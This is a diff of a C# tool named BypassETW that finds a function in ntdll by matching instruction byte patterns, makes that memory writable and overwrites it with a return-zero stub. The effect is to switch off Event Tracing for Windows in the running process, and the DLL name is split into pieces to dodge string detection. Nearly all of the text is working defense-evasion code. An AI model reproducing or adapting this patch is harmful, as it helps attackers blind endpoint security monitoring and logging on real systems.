@@ -11,8 +11,32 @@ namespace BypassETW
     {
         static byte[] patch_code_x64 = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
         static byte[] patch_code_x86 = new byte[] { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
-        public static uint etw_offset_x64 = 0x3DEC0;
-        public static uint etw_offset_x86 = 0x590;
+        // public static uint etw_offset_x64 = 0x3DEC0;
+        // public static uint etw_offset_x86 = 0x590;
+        static byte[] egg_x86 = new byte[] 
+        {
+            0x8b, 0xff,                                 // mov     edi,edi
+            0x55,                                       // push    ebp
+            0x8b, 0xec,                                 // mov     ebp,esp
+            0x83, 0xe4, 0xf8,                           // and     esp,0FFFFFFF8h
+            0x81, 0xec, 0xe0, 0x00, 0x00, 0x00,         // sub     esp,0E0h
+            0xa1, 0x70, 0xb3, 0x38, 0x77,               // mov     eax,dword ptr [ntdll!__security_cookie (7738b370)]
+            0x33, 0xc4,                                       // xor     eax,esp
+            0x89, 0x84, 0x24, 0xdc, 0x00, 0x00, 0x00    // mov     dword ptr [esp+0DCh],eax
+        };
+
+        static byte[] egg_x64 = new byte[]
+        {
+            0x4c, 0x8b, 0xdc,                           // mov     r11,rsp
+            0x48, 0x83, 0xec, 0x58,                     // sub     rsp,58h
+            0x4d, 0x89, 0x4b, 0xe8,                     // mov     qword ptr [r11-18h],r9
+            0x33, 0xc0,                                 // xor     eax,eax
+            0x45, 0x89, 0x43, 0xe0,                     // mov     dword ptr [r11-20h],r8d
+            0x45, 0x33, 0xc9,                           // xor     r9d,r9d
+            0x49, 0x89, 0x43, 0xd8,                     // mov     qword ptr [r11-28h],rax
+            0x45, 0x33, 0xc0,                           // xor     r8d,r8d
+        };
+
 
         [DllImport("kernel32")]
         private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -33,36 +57,65 @@ namespace BypassETW
             return is64Bit;
         }
 
-
-        private static void MemoryPatch(byte[] patch, string lib, string funcName, uint offset = 0)
+        private static IntPtr FindAddress(IntPtr address, byte[] egg)
         {
+            while (true)
+            {
+                int count = 0;
 
+                while (true)
+                {
+                    // IntPtr ori_Addr = address;
+                    address = IntPtr.Add(address, 1);
+                    if (Marshal.ReadByte(address) == (byte)egg.GetValue(count))
+                    {
+                        count++;
+                        if (count == egg.Length)
+                            return IntPtr.Subtract(address, egg.Length - 1);
+                    }
+                    else
+                    {
+                        break;
+                    }
+                }
+            }
+        }
+
+
+        private static void MemoryPatch(string dllname, string funcname, byte[] egg, byte[] patch)
+        {
+             
             uint Oldprotect;
             uint Newprotect;
 
-            IntPtr libAddr = LoadLibrary(lib);
-            IntPtr funcAddr = GetProcAddress(libAddr, funcName);
+            IntPtr libAddr = LoadLibrary(dllname);
+            IntPtr funcAddr = GetProcAddress(libAddr, funcname);
+            byte temp = Marshal.ReadByte(funcAddr, 1);
 
-            funcAddr = (IntPtr)(funcAddr.ToInt64() + offset);
-            VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
-            Marshal.Copy(patch, 0, funcAddr, patch.Length);
-            VirtualProtect(funcAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
+            IntPtr PatchAddr = FindAddress(funcAddr, egg);
+            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, 0x40, out Oldprotect);
+            Marshal.Copy(patch, 0, PatchAddr, patch.Length);
+            VirtualProtect(PatchAddr, (UIntPtr)patch.Length, Oldprotect, out Newprotect);
         }
 
-        private static void CodePatchETW(byte[] patch, uint offset = 0)
+        /*
+        private static void CodePatchETW()
         {
-            MemoryPatch(patch, "ntd" + "ll.d" + "ll", "RtlInitializeResource", offset);
+            StartPatch();
         }
+        */
 
         public static void StartPatch()
         {
             if (is64Bit())
             {
-                CodePatchETW(patch_code_x64, etw_offset_x64);
+                // Console.WriteLine("x64");
+                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x64, patch_code_x64);
             }
             else
             {
-                CodePatchETW(patch_code_x86, etw_offset_x86);
+                // Console.WriteLine("x86");
+                MemoryPatch("ntd" + "ll.d" + "ll", "RtlInitializeResource", egg_x86, patch_code_x86);
             }
         }
 
